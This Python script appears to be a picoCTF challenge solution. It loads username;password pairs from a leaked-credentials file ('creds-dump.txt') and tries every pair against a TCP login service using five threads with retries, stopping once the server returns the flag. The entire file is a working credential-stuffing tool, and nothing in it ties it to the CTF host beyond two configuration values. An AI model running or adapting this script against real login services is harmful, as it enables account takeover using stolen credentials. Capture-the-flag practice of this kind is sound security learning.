import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

host = "crystal-peak.picoctf.net"
port = 52775
THREADS = 5

stop_event = threading.Event()
counter = 0
lock = threading.Lock()


def recv_until(s, marker, timeout=5):
    s.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
    return data


def recv_all(s, timeout=2):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def try_login(line, total, retries=2):
    global counter

    if stop_event.is_set():
        return None

    if ";" not in line:
        return None

    try:
        username, password = line.strip().split(";", 1)
    except:
        return None

    with lock:
        counter += 1
        current = counter

    print(f"[{current}/{total}] Trying {username}:{password}")

    for attempt in range(retries):
        if stop_event.is_set():
            return None
        try:
            time.sleep(0.3)
            s = socket.socket()
            s.settimeout(8)
            s.connect((host, port))

            recv_until(s, b":")  # "Username:"
            s.send((username + "\n").encode())

            recv_until(s, b":")  # "Password:"
            s.send((password + "\n").encode())

            response = recv_all(s).decode(errors="ignore")
            s.close()

            if "picoCTF" in response:
                print(f"[{current}]  SUCCESS: {username}:{password}")
                return (username, password, response)
            else:
                print(f"[{current}]  Failed")
                return None

        except socket.timeout:
            print(f"[{current}]  Timeout (attempt {attempt + 1}/{retries})")
            time.sleep(1)
        except socket.error as e:
            print(f"[{current}]  Socket error: {e} (attempt {attempt + 1}/{retries})")
            time.sleep(2**attempt)
        except Exception as e:
            print(f"[{current}]  Error: {e}")
            return None
        finally:
            try:
                s.close()
            except:
                pass

    return None


def main():
    with open("creds-dump.txt", encoding="utf-8", errors="ignore") as f:
        lines = [l for l in f.readlines() if ";" in l]

    total = len(lines)
    print(f"Valid credentials to try: {total}")
    print(f"Running with {THREADS} threads\n")

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(try_login, line, total): line for line in lines}

        for future in as_completed(futures):
            if stop_event.is_set():
                break
            result = future.result()
            if result:
                username, password, response = result
                stop_event.set()
                print("\n=== FLAG FOUND ===")
                print(f"Credentials: {username}:{password}")
                print(f"Response:\n{response}")
                print(f"Time taken: {time.time() - start_time:.2f}s")
                break

    print(f"\nFinished in {time.time() - start_time:.2f}s")


if __name__ == "__main__":
    main()
